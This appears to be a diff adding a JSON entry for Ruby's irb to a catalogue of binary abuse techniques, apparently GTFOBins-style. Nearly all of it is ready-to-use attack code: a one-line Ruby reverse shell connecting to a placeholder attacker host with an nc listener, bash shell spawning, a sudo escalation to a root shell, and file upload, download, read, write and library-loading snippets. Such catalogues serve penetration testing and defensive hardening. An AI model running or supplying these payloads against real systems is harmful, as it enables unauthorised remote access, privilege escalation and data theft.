@@ -1,0 +1,47 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "irb\nexec '/bin/bash'\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "irb\nrequire 'socket'; exit if fork;c=TCPSocket.new('[host]', [port]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Serve files in the local folder running an HTTP server on port [port].",
+        "code": "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => [port], :DocumentRoot => Dir.pwd).start;\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "irb\nrequire 'open-uri'; IO.copy_stream(open('[url]'), '[file]')\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "irb\nFile.open(\"[file]\", \"w+\") { |f| f.write(\"DATA\") }\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "irb\nputs File.read(\"[file]\")\n"
+      }
+    ],
+    "library-load": [
+      {
+        "code": "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo irb\nexec '/bin/bash'\n"
+      }
+    ]
+  }
+}
